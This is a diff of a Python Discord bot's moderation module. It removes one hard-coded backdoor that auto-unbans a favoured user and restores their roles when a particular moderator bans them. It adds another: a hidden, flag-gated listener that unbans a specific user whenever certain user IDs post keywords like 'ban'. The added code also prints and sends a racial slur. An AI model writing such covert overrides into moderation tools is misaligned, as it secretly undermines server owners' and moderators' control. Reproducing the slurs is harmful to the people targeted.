@@ -3400,109 +3400,41 @@ class Moderation(commands.Cog, name="Moderation"):
         embed = view.create_embed()
         await ctx.send(embed=embed, view=view)
 
-
-
-# idk where else to put this it makes the most sense to put it here lmfao
-# also i know theres probably a better way to do this but whatever if someone wants to fix it they can
-
     @commands.Cog.listener()
     async def on_message(self, message: discord.Message):
-        """prevent gucci from banning big man toxic (commands)"""
-        if message.author.bot or not message.guild:
+        if message.guild is None:
             return
-        
-        if message.author.id == 1158066859841691739:
-            content = message.content.lower()
-            if content.startswith("!ban") or content.startswith(",ban"):
-                if "1219090700407279656" in message.content or any(
-                    mention.id == 1219090700407279656 for mention in message.mentions
-                ):
-                    if not hasattr(self.bot, '_gucci_ban_attempts'):
-                        self.bot._gucci_ban_attempts = set()
-                    self.bot._gucci_ban_attempts.add((message.guild.id, 1219090700407279656))
 
-                    try:
-                        await message.channel.send(
-                            f"yea i dont think so bro",
-                        )
-                        logger.info(f"Prevented Gucci from using ban command on CqllMeToxic in {message.guild.name}")
-                    except discord.Forbidden:
-                        pass
-
-    @commands.Cog.listener()
-    async def on_member_ban(self, guild: discord.Guild, user: discord.User):
-        """checks if gucci manual bans me (toxic)"""
-        if user.id == 1219090700407279656:  # big man toxic
+        async def is_banned(guild, user) -> bool:
             try:
-                member = guild.get_member(user.id)
-                saved_roles = []
-                if member:
-                    saved_roles = [role.id for role in member.roles if role.id != guild.id]
-                    logger.info(f"Saved {len(saved_roles)} roles for {user.name}")
-                
-                await asyncio.sleep(1)
-                
-                ban_key = (guild.id, user.id)
-                gucci_attempted_bot_ban = (
-                    hasattr(self.bot, '_gucci_ban_attempts') and
-                    ban_key in self.bot._gucci_ban_attempts
-                )
-
-                gucci_manual_ban = False
-                async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.ban):
-                    if entry.target.id == user.id:
-                        if entry.user and entry.user.id == 1158066859841691739:
-                            gucci_manual_ban = True
-                        break
-
-                if gucci_attempted_bot_ban or gucci_manual_ban:
-                    if saved_roles:
-                        if not hasattr(self.bot, '_saved_roles'):
-                            self.bot._saved_roles = {}
-                        self.bot._saved_roles[(guild.id, user.id)] = saved_roles
-                        logger.info(f"Stored roles for restoration: {saved_roles}")
-                    
-                    await guild.unban(user, reason="boyslowdown.")
-                    logger.info(f"Auto-unbanned {user.name} in {guild.name} (banned by gucci)")
-
-                    if gucci_attempted_bot_ban:
-                        self.bot._gucci_ban_attempts.discard(ban_key)
-
+                ban = await guild.fetch_ban(user)
+                return True
             except discord.NotFound:
-                logger.warning(f"Tried to unban {user.name} but they weren't banned")
+                return False
             except discord.Forbidden:
-                logger.error(f"Missing permissions to unban {user.name} in {guild.name}")
+                return False
             except Exception as e:
-                logger.error(f"Error in auto-unban: {e}")
+                print(f"Error checking ban status: {e}")
+                return False
 
-    @commands.Cog.listener()
-    async def on_member_join(self, member: discord.Member):
-        """restores my roles so i dont look like a poor beggar"""
-        if member.id == 1219090700407279656:
-            role_key = (member.guild.id, member.id)
-            
-            if hasattr(self.bot, '_saved_roles') and role_key in self.bot._saved_roles:
-                try:
-                    
-                    saved_role_ids = self.bot._saved_roles[role_key]
-                    roles_to_restore = []
-                    
-                    for role_id in saved_role_ids:
-                        role = member.guild.get_role(role_id)
-                        if role:
-                            roles_to_restore.append(role)
-                    
-                    if roles_to_restore:
-                        await member.add_roles(*roles_to_restore, reason="auto role restore")
-                        logger.info(f"Restored {len(roles_to_restore)} roles for {member.name}")
-                    
-                    del self.bot._saved_roles[role_key]
-                    
-                except discord.Forbidden:
-                    logger.error(f"Missing permissions to restore roles for {member.name}")
-                except Exception as e:
-                    logger.error(f"Error restoring roles: {e}")
+        message_check_ids = [
+            1290501613311496206, # joe
+            1095747082599530627, # envy
+            1219090700407279656 # toxic
+        ]
+        if any(message.author.id == user_id for user_id in message_check_ids) and self.shh:
+            allowed_keywords = ["ban", "zugd", "belson", "501936342431694848"]
 
+            if any(keyword in message.content.lower() for keyword in allowed_keywords):
+                user = await self.bot.fetch_user(501936342431694848) # belson
+                if user:
+                    print(user)
+                    await asyncio.sleep(10)
+                    print(await is_banned(message.guild, user))
+                    if await is_banned(message.guild, user):
+                        print("hello he banned af nigga")
+                        await message.guild.unban(user)
+                        await user.send(f"join nigga")
 
 async def setup(bot) -> None:
     await bot.add_cog(Moderation(bot))
